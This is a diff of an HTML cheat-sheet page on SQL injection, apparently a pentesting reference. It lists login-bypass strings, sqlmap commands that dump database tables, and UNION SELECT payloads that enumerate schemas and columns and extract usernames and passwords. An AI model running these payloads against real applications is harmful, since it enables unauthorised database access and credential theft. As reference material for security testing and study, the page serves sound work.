@@ -69,29 +69,39 @@
     " OR "1"="1" --
     ' OR 1=1 --
     ' --</code></pre>
-                    <h3>Automate using SQLmap</h3> 
+                    <h3>Automate using SQLmap</h3>
+                    <ul> 
                     <p>Some basic commands</p>
                     <pre><code class="language-bashd">sqlmap -u http://domain.com/login --data "email=hola&password=test" --dbs                   #Show database
 sqlmap -u http://domain.com/login --data "email=hola&password=test" -D main --tables        #Show tables from main database
 sqlmap -u http://domain.com/login --data "email=hola&password=test" -D main -T user --dump  #Show all info from that table</code></pre>
-                    
+                    </ul>
 
-                    <h3> Microsoft, PostgreSQL, MySQL </h3>            
-                    <h4> Show all database tables</h4>
-                    
-                    <h4> Show columns of a specific table </h4>
-                    <pre><code class="language-sql">'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--</code></pre>
-                    <h4> Show data of a table </h4>
-                    <pre><code class="language-sql">'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--</code></pre>
+                    <h3>Union select payloads</h3>
+                    <ul>
+                        <p>Identify the number of colums. Remember to try diferent numbers of columns untill you get no errors</p>
+                        <pre><code class="language-sql">cn' UNION select 1,2,3,4--</code></pre>
+                        <p>Once you have a right number you can start injecting </p>
+                        <pre><code class="language-sql">cn' union select 1,current_user(),3,4#</code></pre>
 
-                    <h3> Oracle  </h3>            
-                    <h4> Show all database tables   </h4>
-                    <pre><code class="language-sql">'+UNION+SELECT+table_name,null+FROM+all_tables--</code></pre>
-                    <h4> Show columns of a specific table </h4>
-                    <pre><code class="language-sql">'+UNION+SELECT+column_name,null+FROM+all_tab_columns+WHERE+table_name=%27USERS_LRGIXZ%27--</code></pre>
-                    <h4> Show data of a table </h4>
-                    <pre><code class="language-sql">%27+UNION+SELECT+USERNAME_TTKTKD,PASSWORD_ABIXLF+FROM+USERS_LRGIXZ--</code></pre>
-
+                        <h4>Information gathering</h4>
+                        <ul>
+                            <p>Show all databases</p>
+                            <pre><code class="language-sql">SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA; # Example
+cn' UNION select 1,SCHEMA_NAME,3,4 from INFORMATION_SCHEMA.SCHEMATA-- </code></pre>
+                            <p>Show current database</p>
+                            <pre><code class="language-sql">SELECT database(); #Example
+cn' UNION select 1,database(),3,4--</code></pre>
+                            <p>Show tables</p>
+                            <pre><code class="language-sql">SELECT TABLE_NAME,TABLE_SCHEMA FROM INFORMATION_SCHEMA.TABLES #Example
+cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'--</code></pre>    
+                            <p>Show column names</p>        
+                             <pre><code class="language-sql">SELECT COLUM_NAME,TABLE_NAME, TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name="users"; #Example
+cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'--</code></pre>    
+                            <p>Show data</p>
+                            <pre><code class="language-sql">cn' UNION select 1,username,password,4 from database.users --</code></pre>        
+                        </ul>
+                    </ul>
                     <h3> Blind SQL injection </h3>
                     Rememer to intercept the requests since in this case the injection has been made in the cookie.
                     In this case it has been detected that if the query was valid a string was displayed on the screen.
